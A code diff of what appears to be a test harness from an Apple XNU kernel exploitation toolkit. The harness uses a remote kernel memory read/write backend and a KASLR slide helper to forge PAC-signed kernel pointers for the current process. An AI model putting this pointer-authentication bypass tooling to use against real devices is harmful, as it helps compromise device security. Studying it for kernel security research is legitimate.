@@ -12,10 +12,7 @@
 #include <unistd.h>
 #include <limits.h>
 
-#include <gym_client.h>
-
 #include "kmem.h"
-#include "kmem_gym.h"
 #include "kmem_remote.h"
 #include "slider.h"
 #include "platform_params.h"
@@ -32,43 +29,41 @@
 #include "util_zalloc.h"
 #include "util_kfunc_basic.h"
 #include "util_ptrauth.h"
+#include "util_assert.h"
 
 
-void test_run_pacda(int argc, const char* argv[]) {
+int main(int argc, const char* argv[]) {
+    xe_assert_cond(argc, ==, 2);
+    
     struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
     xe_kmem_use_backend(backend);
-    xe_slider_init();
+    xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
     
-    uintptr_t kernproc = xe_kmem_read_uint64(xe_slider_slide(VAR_KERNPROC_ADDR));
-
-    uintptr_t proc;
-    int error = xe_xnu_proc_find(kernproc, getpid(), &proc);
-    if (error) {
-        printf("[ERROR] cannot find current proc, err: %d\n", error);
-        return;
-    }
-    
+    uintptr_t proc = xe_xnu_proc_current_proc();
     printf("[INFO] pid: %d\n", getpid());
     printf("[INFO] proc: %p\n", (void*)proc);
     
-    for (int i=0; i<10; i++) {
-        uintptr_t ptr = kernproc;
+    for (int i=0; i<1; i++) {
+        uintptr_t ptr = proc;
         uintptr_t ctx = 0xabcdef;
         uintptr_t signed_ptr;
         
-        error = xe_util_pacda_sign(proc, ptr, ctx, &signed_ptr);
+        int error = xe_util_pacda_sign(proc, ptr, ctx, &signed_ptr);
         if (error) {
             printf("[ERROR] ptr sign failed, err: %d\n", error);
-            return;
+            return 1;
         }
         
         printf("[INFO] signed ptr: %p\n", (void*)signed_ptr);
     }
+    return 0;
 }
 
-int main(int argc, const char* argv[]) {
-    xe_kmem_use_backend(xe_kmem_gym_create());
-    xe_slider_init();
+/*
+int main0(int argc, const char* argv[]) {
+    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
+    xe_kmem_use_backend(backend);
+    xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
     
     uintptr_t record_function;
     int error = gym_get_record_function_address(&record_function);
@@ -113,3 +108,4 @@ int main(int argc, const char* argv[]) {
         xe_util_kfunc_reset(util2);
     }
 }
+*/
